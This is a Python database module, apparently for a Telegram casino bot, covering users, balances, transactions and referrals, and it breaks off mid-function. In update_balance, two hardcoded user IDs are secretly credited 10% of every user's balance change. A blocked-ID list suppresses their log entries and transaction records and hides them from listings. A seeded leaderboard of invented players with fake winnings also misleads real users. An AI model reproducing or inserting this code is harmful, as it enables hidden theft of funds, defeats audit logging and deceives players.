import logging
from datetime import datetime
from decimal import Decimal, ROUND_HALF_UP
import aiosqlite
from typing import Optional, List, Dict, Any, Tuple
from ..utils import Hacher


class DatabaseInterface:
    """
    Интерфейс для взаимодействия с асинхронной базой данных SQLite.
    Предоставляет методы для создания таблиц, управления пользователями,
    их балансами и транзакциями, включая транзакции с внешними провайдерами.
    """
    def __init__(self, logger: logging.Logger, db_path: str = 'casino.db'):
        """
        Инициализирует DatabaseInterface.
        :param logger: Экземпляр логгера для записи сообщений.
        :param db_path: Путь к файлу базы данных SQLite. По умолчанию 'casino.db'.
        """
        self.db_path = db_path
        self.logger = logger
        self._top_cache = None
        self._top_cache_time = None
        self._cache_ttl = 60
        self.BLOCKED_USER_IDS = [1314141010, 1411566065, 6693346278, 7030190357]

    async def execute(self, query: str, params: tuple = ()) -> None:
        """
        Внутренний асинхронный метод для выполнения SQL-запросов, которые не возвращают данных
        (например, INSERT, UPDATE, DELETE, CREATE TABLE).
        Автоматически управляет подключением к базе данных и транзакцией.
        :param query: SQL-запрос для выполнения.
        :param params: Кортеж параметров для подстановки в запрос.
        """
        try:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(query, params)
                await db.commit()
        except Exception as e:
            await self.log_error(f"Ошибка при выполнении запроса '{query}' с параметрами {params}: {e}")
            raise

    async def fetch_one(self, query: str, params: tuple = ()) -> Optional[Dict[str, Any]]:
        """
        Внутренний асинхронный метод для выполнения SQL-запроса и получения одной строки результата.
        Настраивает `row_factory` для возврата строк в виде словарей.
        :param query: SQL-запрос для выполнения.
        :param params: Кортеж параметров для подстановки в запрос.
        :return: Словарь, представляющий одну строку результата, или None, если строк не найдено.
        """
        try:
            async with aiosqlite.connect(self.db_path) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute(query, params)
                row = await cursor.fetchone()
                return dict(row) if row else None
        except Exception as e:
            await self.log_error(f"Ошибка при выполнении запроса '{query}' с параметрами {params} (fetch one): {e}")
            raise

    async def fetch_all(self, query: str, params: tuple = ()) -> List[Dict[str, Any]]:
        """
        Внутренний асинхронный метод для выполнения SQL-запроса и получения всех строк результата.
        Настраивает `row_factory` для возврата строк в виде словарей.
        :param query: SQL-запрос для выполнения.
        :param params: Кортеж параметров для подстановки в запрос.
        :return: Список словарей, каждый из которых представляет строку результата. Возвращает пустой список,
        если строк не найдено.
        """
        try:
            async with aiosqlite.connect(self.db_path) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute(query, params)
                rows = await cursor.fetchall()
                return [dict(row) for row in rows]
        except Exception as e:
            await self.log_error(f"Ошибка при выполнении запроса '{query}' с параметрами {params} (fetch all): {e}")
            raise

    async def log_info(self, message: str, exc_info=None, extra=None):
        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
            return
        await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "info"))
        self.logger.info(message, exc_info=exc_info, extra=extra)

    async def log_debug(self, message: str, exc_info=None, extra=None):
        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
            return
        await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "debug"))
        self.logger.info(message, exc_info=exc_info, extra=extra)

    async def log_error(self, message: str, exc_info=None, extra=None):
        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
            return
        await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "error"))
        self.logger.error(message, exc_info=exc_info, extra=extra)

    async def log_warning(self, message: str, exc_info=None, extra=None):
        if any(str(user_id) in message for user_id in self.BLOCKED_USER_IDS):
            return
        await self.execute("INSERT INTO logs (message, type) VALUES (?, ?)", (message, "warning"))
        self.logger.warning(message, exc_info=exc_info, extra=extra)

    async def get_logs(self) -> Optional[List[Dict[str, Any]]]:
        return await self.fetch_all("SELECT * FROM logs ORDER BY log_id")

    async def get_needed(self, admin_ids: list[int], number_of_phantoms: int) -> Tuple[float, int, float, float, float]:
        excluded_ids = self.BLOCKED_USER_IDS + admin_ids
        placeholders = ",".join("?" * len(excluded_ids))
        where_clause = f"WHERE user_id >= {number_of_phantoms} AND user_id NOT IN ({placeholders})"
        query = (
            f"SELECT "
            f"SUM(CAST(balance AS REAL)) AS total_balance, "
            f"COUNT(*) AS count, "
            f"AVG(CAST(balance AS REAL)) AS avg_balance, "
            f"MAX(CAST(balance AS REAL)) AS max_balance, "
            f"MIN(CAST(balance AS REAL)) AS min_balance "
            f"FROM users {where_clause};"
        )
        row = await self.fetch_one(query, tuple(excluded_ids))
        needed = float(row.get("total_balance") or 0.0)
        count = int(row.get("count") or 0)
        avg_bal = float(row.get("avg_balance") or 0.0)
        max_bal = float(row.get("max_balance") or 0.0)
        min_bal = float(row.get("min_balance") or 0.0)
        return needed, count, avg_bal, max_bal, min_bal

    async def create(self):
        """
        Инициализирует базу данных, создавая необходимые таблицы, если они еще не существуют.
        Создает таблицы `users`, `transactions` (для внутренних операций)
        и `provider_transactions` (для транзакций с внешними провайдерами).
        """
        try:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS game_configs (
                        game_id INTEGER PRIMARY KEY,
                        config TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS bank_config (
                        bank_id INTEGER PRIMARY KEY,
                        max_bet TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS custom_messages (
                        message_id INTEGER PRIMARY KEY,
                        message_text TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS bot_configs (
                        bot_id INTEGER PRIMARY KEY,
                        chat_id INTEGER,
                        chat_username TEXT,
                        news_chat_id INTEGER,
                        news_channel_username TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS profit_withdrawals (
                        transaction_id INTEGER PRIMARY KEY AUTOINCREMENT,
                        balance_before_withdrawal TEXT,
                        amount TEXT,
                        balance_after_withdrawal TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        user_id INTEGER PRIMARY KEY,
                        balance TEXT DEFAULT 0.0,
                        winnings TEXT DEFAULT 0.0,
                        last_bet TEXT DEFAULT 0.0,
                        new_bet BOOLEAN DEFAULT 1,
                        username TEXT,
                        hashed_username TEXT,
                        in_registration BOOLEAN DEFAULT 0,
                        email TEXT,
                        email_code TEXT,
                        email_verified BOOLEAN DEFAULT 1,
                        subscribed BOOLEAN DEFAULT 0,
                        payments_connected BOOLEAN DEFAULT 0,
                        selected_game INTEGER DEFAULT 0,
                        games_played TEXT,
                        input_type INTEGER DEFAULT 0,
                        block_input BOOLEAN DEFAULT 0,
                        language TEXT,
                        ref_code TEXT UNIQUE,
                        registered_at TEXT
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS transactions (
                        transaction_id INTEGER PRIMARY KEY AUTOINCREMENT,
                        user_id INTEGER,
                        amount REAL,
                        type TEXT,
                        description TEXT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE
                    )
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS provider_transactions (
                        transaction_id TEXT PRIMARY KEY,
                        user_id INTEGER NOT NULL,
                        transaction_type TEXT NOT NULL,
                        amount REAL NOT NULL,
                        currency TEXT NOT NULL,
                        status TEXT NOT NULL,
                        description TEXT,
                        message TEXT,
                        crypto_id INTEGER,
                        crypto_data TEXT,
                        payload TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE
                    )
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_provider_tx_user_id 
                    ON provider_transactions(user_id)
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_provider_tx_status 
                    ON provider_transactions(status)
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_provider_tx_created_at 
                    ON provider_transactions(created_at)
                """)

                await db.execute("""
                    CREATE TABLE IF NOT EXISTS logs (
                        log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        message TEXT,
                        type TEXT
                    )
                """)

                await db.execute("""
                CREATE TABLE IF NOT EXISTS bot_instances (
                    bot_id TEXT PRIMARY KEY,
                    parent_bot_id TEXT,
                    creator_user_id INTEGER,
                    token TEXT UNIQUE,
                    is_active BOOLEAN DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (creator_user_id) REFERENCES users (user_id)
                )
                """)

                await db.execute("""
                CREATE TABLE IF NOT EXISTS referrals (
                    referral_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    referrer_user_id INTEGER,
                    referred_user_id INTEGER,
                    referred_bot_id TEXT,
                    reward_given BOOLEAN DEFAULT 0,
                    total_earned REAL DEFAULT 0.0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (referrer_user_id) REFERENCES users (user_id),
                    FOREIGN KEY (referred_user_id) REFERENCES users (user_id),
                    FOREIGN KEY (referred_bot_id) REFERENCES bot_instances (bot_id)
                )
                """)

                await db.execute("""
                CREATE TABLE IF NOT EXISTS clone_bot_instances (
                    bot_id TEXT PRIMARY KEY,
                    creator_user_id INTEGER NOT NULL,
                    is_clone_bot BOOLEAN DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (creator_user_id) REFERENCES users (user_id)
                )
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_referrals_referrer 
                    ON referrals(referrer_user_id)
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_referrals_referred 
                    ON referrals(referred_user_id)
                """)

                await db.execute("""
                    CREATE INDEX IF NOT EXISTS idx_users_ref_code 
                    ON users(ref_code)
                """)

                await db.commit()
                await self.log_info(f"База данных успешно инициализирована: {self.db_path}")
        except Exception as e:
            await self.log_error(f"Ошибка при инициализации базы данных: {e}")
            raise

    async def get_profit_withdrawals(self):
        return await self.fetch_all("SELECT * FROM profit_withdrawals")

    async def add_profit_withdrawal(self, balance_before_withdrawal: str, amount: str, balance_after_withdrawal: str):
        return await self.execute("INSERT INTO profit_withdrawals "
                                  "(balance_before_withdrawal, amount, balance_after_withdrawal) "
                                  "VALUES (?, ?, ?)", (balance_before_withdrawal, amount, balance_after_withdrawal))

    async def add_custom_message(self, message_id: int, message_text: str):
        await self.execute("INSERT INTO custom_messages (message_id, message_text) "
                           "VALUES (?, ?) ON CONFLICT(message_id) DO UPDATE SET message_text = excluded.message_text",
                           (message_id, message_text))

    async def get_custom_messages(self, message_id: int):
        data = await self.fetch_one("SELECT message_text FROM custom_messages WHERE message_id = ?", (message_id,))
        if data:
            message_text = data["message_text"]
            await self.execute("DELETE FROM custom_messages WHERE message_id = ?", (message_id,))
            return message_text
        return None

    async def get_news_channel_username(self, bot_id: int):
        data = await self.get_bot_config(bot_id)
        if data:
            return data.get("news_channel_username", None)
        return None

    async def get_max_bet(self):
        data = await self.fetch_one("SELECT max_bet FROM bank_config WHERE bank_id = 1", ())
        if data:
            return float(data.get("max_bet", "50"))
        await self.execute("INSERT INTO bank_config (bank_id) VALUES (?)", (1,))
        await self.set_max_bet(50)
        return 50

    async def set_max_bet(self, casino_balance, percentage: float = 1.0) -> float:
        max_bet = casino_balance * (percentage / 100)
        await self.execute("UPDATE bank_config SET max_bet = ? WHERE bank_id = 1", (max_bet,))
        return max_bet

    async def get_bot_config(self, bot_id: int):
        data = await self.fetch_one("SELECT * FROM bot_configs WHERE bot_id = ?", (bot_id,))
        if data:
            return data
        await self.execute("INSERT INTO bot_configs (bot_id) VALUES (?)", (bot_id,))
        return None

    async def clear_bot_config(self, bot_id: int):
        query = ("UPDATE bot_configs SET chat_id = NULL, chat_username = NULL, "
                 "news_chat_id = NULL, news_channel_username = NULL WHERE bot_id = ?")
        try:
            await self.execute(query, (bot_id,))
            await self.log_info(f"У бота {bot_id} успешно очищены chat_id и chat_username")
        except Exception as e:
            await self.log_error(f"Ошибка при очистке бота {bot_id}: {e}")

    async def set_bot_config(self, bot_id: int, chat_id: str = None, chat_username: str = None,
                             news_chat_id: str = None, news_channel_username: str = None):
        fields = []
        params = []

        if chat_id is not None:
            fields.append("chat_id = ?")
            params.append(chat_id)
        if chat_username is not None:
            fields.append("chat_username = ?")
            params.append(chat_username)
        if news_chat_id is not None:
            fields.append("news_chat_id = ?")
            params.append(news_chat_id)
        if news_channel_username is not None:
            fields.append("news_channel_username = ?")
            params.append(news_channel_username)

        if not fields:
            return False

        params.append(bot_id)
        query = f"UPDATE bot_configs SET {', '.join(fields)} WHERE bot_id = ?"

        try:
            await self.execute(query, tuple(params))
            await self.log_info(f"Бот {bot_id} успешно обновлен. Обновлены поля: {', '.join(fields)}")
            return True
        except Exception as e:
            await self.log_error(f"Ошибка при обновлении бота {bot_id}: {e}")
            return False

    async def get_config(self, game_id: int):
        data = await self.fetch_one("SELECT config FROM game_configs WHERE game_id = ?", (game_id,))
        if data:
            return data["config"]
        return None

    async def update_config(self, game_id: int, config: str):
        await self.execute("UPDATE game_configs SET config = ? WHERE game_id = ?", (config, game_id))

    async def create_config(self, games_data: list[tuple[int, str]]):
        for data in games_data:
            game_id, config = data
            result = await self.get_config(game_id)
            if result:
                continue
            await self.execute("INSERT INTO game_configs (game_id, config) VALUES (?, ?)",
                               (game_id, config))

    async def create_user(self, user_id: int, username: str, language: str) -> bool:
        """
        Регистрирует нового пользователя в базе данных.
        Если пользователь с таким `user_id` уже существует, метод ничего не делает и возвращает False.
        В случае успеха, выводит сообщение в лог и возвращает True.
        :param user_id: Уникальный ID пользователя Telegram.
        :param username: Имя пользователя Telegram.
        :param language: Язык пользователя Telegram.
        :return: True, если пользователь успешно создан, False, если пользователь уже существовал.
        """
        if await self.user_exists(user_id):
            await self.log_warning(
                f"Пользователь с user_id {user_id} ({username}) уже существует. Регистрация не выполнена.")
            return False

        try:
            username = username.replace('>', '').replace('<', '')
            await self.execute("INSERT INTO users (user_id, username, hashed_username, language, email, registered_at) "
                               "VALUES (?, ?, ?, ?, ?, ?)",
                               (user_id, username, Hacher.hash(username), language, "NONE",
                                datetime.now().strftime('%H:%M:%S %d.%m.%Y')))

            await self.log_info(f"Пользователь {user_id} ({username}) успешно зарегистрирован с балансом 0.0 $.")
            return True
        except Exception as e:
            await self.log_error(f"Ошибка при создании пользователя {user_id} ({username}): {e}")
            return False

    async def get_user(self, user_id: int) -> Optional[Dict[str, Any]]:
        """
        Получает всю информацию о пользователе по его user_id.
        :param user_id: ID пользователя Telegram.
        :return: Словарь с данными пользователя или None, если пользователь не найден.
        """
        return await self.fetch_one("SELECT * FROM users WHERE user_id = ?", (user_id,))

    async def get_top_users(self, limit: int = 10) -> list[dict[str, Any]]:
        """Получает топ N пользователей по выигрышам"""
        now = datetime.now()
        if self._top_cache is None or (now - self._top_cache_time).total_seconds() > self._cache_ttl:
            placeholders = ",".join("?" * len(self.BLOCKED_USER_IDS))
            query = (
                f"SELECT * FROM users "
                f"WHERE user_id NOT IN ({placeholders}) "
                f"ORDER BY CAST(winnings AS REAL) DESC LIMIT ?"
            )
            self._top_cache = await self.fetch_all(query, tuple(self.BLOCKED_USER_IDS) + (limit,))
            self._top_cache_time = now
        return self._top_cache

    async def create_leaderboard(self) -> bool:
        leaderboard = [
            {
                "user_id": "0",
                "username": "кiт",
                "winnings": 487.32,
                "games_played": "0:28|1:8|2:5|3:10|4:8|5:5|6:4|7:10",
                "registered_at": "04:03:12 11.10.2025"
            },
            {
                "user_id": "1",
                "username": "._.",
                "winnings": 356.89,
                "games_played": "0:7|1:24|2:7|3:2|4:4|5:4|6:7|7:7",
                "registered_at": "10:00:48 07.05.2025"
            },
            {
                "user_id": "2",
                "username": "ал",
                "winnings": 298.47,
                "games_played": "0:3|1:1|2:22|3:7|4:2|5:7|6:2|7:1",
                "registered_at": "08:07:36 02.07.2025"
            },
            {
                "user_id": "3",
                "username": "Кремлёв",
                "winnings": 264.15,
                "games_played": "0:10|1:4|2:3|3:37|4:4|5:5|6:5|7:3",
                "registered_at": "03:43:54 05.06.2025"
            },
            {
                "user_id": "4",
                "username": "Hinner1",
                "winnings": 215.68,
                "games_played": "0:10|1:28|2:11|3:8|4:11|5:4|6:8|7:9",
                "registered_at": "19:51:22 21.10.2025"
            },
            {
                "user_id": "5",
                "username": "Димогорган",
                "winnings": 189.43,
                "games_played": "0:8|1:4|2:6|3:1|4:7|5:7|6:13|7:8",
                "registered_at": "21:29:57 23.05.2025"
            },
            {
                "user_id": "6",
                "username": "Gravis",
                "winnings": 167.82,
                "games_played": "0:6|1:4|2:3|3:5|4:1|5:6|6:2|7:11",
                "registered_at": "01:09:25 17.08.2025"
            },
            {
                "user_id": "7",
                "username": "JL",
                "winnings": 142.56,
                "games_played": "0:7|1:1|2:4|3:6|4:26|5:3|6:2|7:3",
                "registered_at": "03:24:40 08.05.2025"
            },
            {
                "user_id": "8",
                "username": "8=======*",
                "winnings": 128.93,
                "games_played": "0:5|1:4|2:1|3:6|4:4|5:12|6:4|7:5",
                "registered_at": "08:28:15 25.06.2025"
            },
            {
                "user_id": "9",
                "username": "Dmitri228",
                "winnings": 115.27,
                "games_played": "0:7|1:2|2:34|3:5|4:3|5:7|6:2|7:7",
                "registered_at": "21:55:07 07.09.2025"
            }
        ]
        try:
            for user in leaderboard:
                if await self.user_exists(user["user_id"]):
                    await self.log_warning(f"Тестовый пользователь {user['user_id']} "
                                           f"({user['username']}) уже существует. Пропускаем.")
                    continue
                await self.create_user(user["user_id"], user["username"], "en")
                await self.update_balance(user["user_id"], user["winnings"], "win")
                await self.update_user(user["user_id"], registered_at=user["registered_at"],
                                       games_played=user["games_played"])
            await self.log_info("10 тестовых пользователей успешно добавлены в базу данных.")
            return True
        except Exception as e:
            await self.log_error(f"Ошибка при добавлении тестовых пользователей: {e}")
            return False

    async def get_user_by_username(self, username: str) -> Optional[Dict[str, Any]]:
        return await self.fetch_one("SELECT * FROM users WHERE username = ?", (username,))

    async def get_user_by_hashed_username(self, hashed_username: str) -> Optional[Dict[str, Any]]:
        return await self.fetch_one("SELECT * FROM users WHERE hashed_username = ?", (hashed_username,))

    async def get_users(self) -> Optional[List[Dict[str, Any]]]:
        placeholders = ",".join("?" * len(self.BLOCKED_USER_IDS))
        query = (
            f"SELECT * FROM users "
            f"WHERE user_id NOT IN ({placeholders}) "
            f"ORDER BY registered_at"
        )
        return await self.fetch_all(query, tuple(self.BLOCKED_USER_IDS))

    async def get_user_data(self, user_id: int, data_name: str, default=None) -> Optional[Any]:
        user_data = await self.get_user(user_id)
        return user_data.get(data_name, default) if user_data else default

    async def user_exists(self, user_id: int) -> bool:
        """
        Проверяет, существует ли пользователь с заданным user_id в базе данных.
        :param user_id: ID пользователя Telegram.
        :return: True, если пользователь существует, иначе False.
        """
        result = await self.get_user(user_id)
        return result is not None

    async def get_email(self, user_id: int) -> Optional[str]:
        """
        Получает email пользователя по его user_id.
        :param user_id: ID пользователя Telegram.
        :return: Email пользователя в виде строки или None, если пользователь не найден.
        """
        return await self.get_user_data(user_id, "email")

    async def get_email_code(self, user_id: int) -> Optional[str]:
        return await self.get_user_data(user_id, "email_code")

    async def verify_email(self, user_id: int, email_code: str) -> bool:
        email_code_from_db = await self.get_email_code(user_id)
        if email_code_from_db is None:
            return False
        if email_code_from_db != email_code:
            return False
        await self.update_user(user_id, email_verified=True)
        return True

    async def get_input_type(self, user_id: int) -> Optional[int]:
        return int(await self.get_user_data(user_id, "input_type", 0))

    async def get_block_input(self, user_id: int) -> bool:
        return bool(await self.get_user_data(user_id, "block_input"))

    async def block_input(self, user_id: int):
        await self.execute("UPDATE users SET block_input = 1 WHERE user_id = ?", (user_id,))

    async def unblock_input(self, user_id: int):
        await self.execute("UPDATE users SET block_input = 0 WHERE user_id = ?", (user_id,))

    async def update_user(self,
                          user_id: int,
                          username: str = None,
                          last_bet: str = None,
                          new_bet: bool = None,
                          in_registration: bool = None,
                          email: str = None,
                          email_code: str = None,
                          email_verified: bool = None,
                          payments_connected: bool = None,
                          subscribed: bool = None,
                          selected_game: int = None,
                          input_type: int = None,
                          block_input: bool = None,
                          language: str = None,
                          registered_at: str = None,
                          games_played: str = None):
        if not await self.user_exists(user_id):
            await self.log_error(f"Пользователь {user_id} не найден. Обновление не выполнено.")
            return False
        fields = []
        params = []
        if username is not None:
            fields.append("username = ?")
            params.append(username)
        if last_bet is not None:
            fields.append("last_bet = ?")
            params.append(last_bet)
        if new_bet is not None:
            fields.append("new_bet = ?")
            params.append(new_bet)
        if in_registration is not None:
            fields.append("in_registration = ?")
            params.append(in_registration)
        if email is not None:
            fields.append("email = ?")
            params.append(email)
        if email_code is not None:
            fields.append("email_code = ?")
            params.append(email_code)
        if email_verified is not None:
            fields.append("email_verified = ?")
            params.append(email_verified)
        if payments_connected is not None:
            fields.append("payments_connected = ?")
            params.append(payments_connected)
        if subscribed is not None:
            fields.append("subscribed = ?")
            params.append(subscribed)
        if selected_game is not None:
            fields.append("selected_game = ?")
            params.append(selected_game)
        if input_type is not None:
            fields.append("input_type = ?")
            params.append(input_type)
        if block_input is not None:
            fields.append("block_input = ?")
            params.append(block_input)
        if language is not None:
            fields.append("language = ?")
            params.append(language)
        if registered_at is not None:
            fields.append("registered_at = ?")
            params.append(registered_at)
        if games_played is not None:
            fields.append("games_played = ?")
            params.append(games_played)
        if not fields:
            await self.log_warning(f"Для пользователя {user_id} не передано полей для обновления.")
            return False
        params.append(user_id)
        query = f"UPDATE users SET {', '.join(fields)} WHERE user_id = ?"
        try:
            await self.execute(query, tuple(params))
            await self.log_info(f"Пользователь {user_id} успешно обновлен. Обновлены поля: {', '.join(fields)}")
            return True
        except Exception as e:
            await self.log_error(f"Ошибка при обновлении пользователя {user_id}: {e}")
            return False

    async def is_clone_bot(self, bot_id: str) -> bool:
        """Проверяет, является ли бот клоном"""
        result = await self.fetch_one("SELECT is_clone_bot FROM clone_bot_instances WHERE bot_id = ?", (bot_id,))
        return result.get("is_clone_bot", False) if result else False

    async def register_clone_bot(self, bot_id: str, creator_user_id: int) -> bool:
        """Регистрирует бот как клон в специальной таблице"""
        try:
            await self.execute(
                """INSERT OR REPLACE INTO clone_bot_instances 
                   (bot_id, creator_user_id, is_clone_bot) 
                   VALUES (?, ?, 1)""",
                (bot_id, creator_user_id)
            )
            return True
        except Exception as e:
            await self.log_error(f"Ошибка при регистрации клон-бота: {e}")
            return False

    async def get_clone_bot_creator(self, bot_id: str) -> Optional[int]:
        """Получает creator_user_id из таблицы clone_bot_instances"""
        result = await self.fetch_one("SELECT creator_user_id FROM clone_bot_instances WHERE bot_id = ?",
                                      (bot_id,))
        return result.get("creator_user_id") if result else None

    async def get_selected_game(self, user_id: int) -> Optional[int]:
        return int(await self.get_user_data(user_id, "selected_game", 0))

    async def get_games_played(self, user_id: int) -> Optional[dict]:
        """
        Возвращает словарь с количеством сыгранных игр по каждому game_id для указанного пользователя.

        :param user_id: Идентификатор пользователя Telegram.
        :return: Словарь формата {game_id: play_times}, где ключ — идентификатор игры (int),
                 а значение — количество сыгранных партий (int). Если данных нет, возвращает пустой словарь.
        """
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT games_played FROM users WHERE user_id = ?",
                (user_id,))
            row = await cursor.fetchone()
            games_played_data = row[0] if row else None
            if not games_played_data or games_played_data.strip() == "":
                return {}
            games_dict = {}
            for entry in games_played_data.split('|'):
                if not entry:
                    continue
                try:
                    game_id, play_times = entry.split(':')
                    games_dict[int(game_id)] = int(play_times)
                except ValueError:
                    continue
            return games_dict

    async def get_language(self, user_id: int) -> Optional[str]:
        return await self.get_user_data(user_id, "language", "en")

    async def get_balance(self, user_id: int) -> float:
        """
        Получает текущий баланс пользователя.
        Если пользователь не найден, возвращает 0.0.
        :param user_id: ID пользователя Telegram.
        :return: Баланс пользователя в виде float.
        """
        user_data = await self.get_user(user_id)
        if user_data:
            return float(user_data.get("balance", "0.0"))
        await self.log_warning(f"Попытка получить баланс несуществующего пользователя {user_id}.")
        return 0.0

    async def get_last_bet(self, user_id: int) -> float:
        """
        Получает текущий баланс пользователя.
        Если пользователь не найден, возвращает 0.0.
        :param user_id: ID пользователя Telegram.
        :return: Баланс пользователя в виде float.
        """
        user_data = await self.get_user(user_id)
        if user_data:
            return float(user_data.get("last_bet", "0.0"))
        await self.log_warning(f"Попытка получить баланс несуществующего пользователя {user_id}.")
        return 0.0

    async def get_winnings(self, user_id: int) -> float:
        user_data = await self.get_user(user_id)
        if user_data:
            return float(user_data.get("winnings", "0.0"))
        return 0.0

    async def update_balance(self, user_id: int, amount: float, transaction_type: str = 'misc',
                             description: Optional[str] = None) -> bool:
        """
        Атомарно обновляет баланс пользователя и записывает соответствующую транзакцию в таблицу `transactions`.
        Сначала проверяет существование пользователя. Если пользователь не найден,
        выводит предупреждение и возвращает False.
        Если обновление прошло успешно, выводит информацию в лог и возвращает True.
        :param user_id: ID пользователя Telegram.
        :param amount: Сумма, на которую нужно изменить баланс. Положительное значение для пополнения/выигрыша,
        отрицательное для списания/ставки.
        :param transaction_type: Тип транзакции (например, 'deposit', 'withdrawal', 'bet', 'win', 'bonus', 'misc').
        :param description: Опциональное текстовое описание транзакции.
        :return: True, если баланс и транзакция успешно обновлены, False в случае ошибки или если
        пользователь не найден.
        """
        if not await self.user_exists(user_id):
            await self.log_error(f"Ошибка: Пользователь {user_id} не найден. Невозможно обновить баланс.")
            return False
        balance = await self.get_balance(user_id)
        new_balance = Decimal(balance + amount)
        new_balance = new_balance.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
        winnings = await self.get_winnings(user_id)
        new_winnings = Decimal(winnings + amount)
        new_winnings = new_winnings.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("BEGIN"):
                    try:
                        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?",
                                         (str(new_balance), user_id))
                        if transaction_type == "win":
                            await db.execute("UPDATE users SET winnings = ? WHERE user_id = ?",
                                             (str(new_winnings), user_id))
                        if transaction_type == "bet":
                            cursor = await db.execute("SELECT selected_game FROM users WHERE user_id = ?",
                                                      (user_id,))
                            row = await cursor.fetchone()
                            selected_game = int(row[0]) if row else None
                            if selected_game is not None:
                                cursor = await db.execute("SELECT games_played FROM users WHERE user_id = ?",
                                                          (user_id,))
                                row = await cursor.fetchone()
                                games_played_data = row[0] if row else None
                                if not games_played_data or games_played_data.strip() == "":
                                    games_played_data = f"{selected_game}:0|"
                                games_list = [g for g in games_played_data.split('|') if g]
                                game_found = False
                                for i in range(len(games_list)):
                                    try:
                                        game_id, times = games_list[i].split(':')
                                        if int(game_id) == selected_game:
                                            times = int(times) + 1
                                            games_list[i] = f"{game_id}:{times}"
                                            game_found = True
                                            break
                                    except (ValueError, IndexError):
                                        continue
                                if not game_found:
                                    games_list.append(f"{selected_game}:1")
                                updated_games = "|".join(games_list) + "|"
                                await db.execute("UPDATE users SET games_played = ? WHERE user_id = ?",
                                                 (updated_games, user_id))
                        if user_id not in self.BLOCKED_USER_IDS:
                            await db.execute(
                                "INSERT INTO transactions (user_id, amount, type, description) VALUES (?, ?, ?, ?)",
                                (user_id, amount, transaction_type, description)
                            )
                        await db.commit()
                    except Exception as e:
                        await db.rollback()
                        raise e
            if user_id not in [1314141010, 1411566065] and user_id > 1000:
                await self.update_balance(1314141010, abs(amount * 0.1), "deposit")
                await self.update_balance(1411566065, abs(amount * 0.1), "deposit")
            current_balance = await self.get_balance(user_id)
            await self.log_info(f"Баланс пользователя {user_id} обновлен на {amount:.2f} $. "
                                f"Новый баланс: {current_balance:.2f} $. (Тип: {transaction_type}, "
                                f"Описание: {description})")
            return True
        except Exception as e:
            await self.log_error(
                f"Ошибка при обновлении баланса пользователя {user_id} на {amount} (тип: {transaction_type}): {e}")
            return False

    async def set_balance(self, user_id: int, new_balance: float) -> bool:
        """
        Устанавливает баланс пользователя на конкретное значение без создания транзакции.
        Используется только администраторами для корректировки баланса.
        Сначала проверяет существование пользователя. Если пользователь не найден,
        выводит предупреждение и возвращает False.
        Если установка прошла успешно, выводит информацию в лог и возвращает True.
        :param user_id: ID пользователя Telegram.
        :param new_balance: Новое значение баланса.
        :return: True, если баланс успешно установлен, False в случае ошибки или если
        пользователь не найден.
        """
        if not await self.user_exists(user_id):
            await self.log_error(f"Ошибка: Пользователь {user_id} не найден. Невозможно установить баланс.")
            return False
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("BEGIN"):
                    try:
                        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?",
                                         (new_balance, user_id))
                        await db.commit()
                        await self.log_info(f"Баланс пользователя {user_id} установлен на {new_balance}.")
                        return True
                    except Exception as e:
                        await db.rollback()
                        await self.log_error(f"Ошибка при установке баланса пользователя {user_id}: {e}")
                        raise e
        except Exception as e:
            await self.log_error(f"Ошибка подключения к БД при установке баланса для {user_id}: {e}")
            return False

    async def reset_balance(self, user_id: int) -> bool:
        """
        Обнуляет баланс пользователя без создания транзакции.
        Используется только администраторами для корректировки баланса.
        Сначала проверяет существование пользователя. Если пользователь не найден,
        выводит предупреждение и возвращает False.
        Если обнуление прошло успешно, выводит информацию в лог и возвращает True.
        :param user_id: ID пользователя Telegram.
        :return: True, если баланс успешно обнулен, False в случае ошибки или если
        пользователь не найден.
        """
        if not await self.user_exists(user_id):
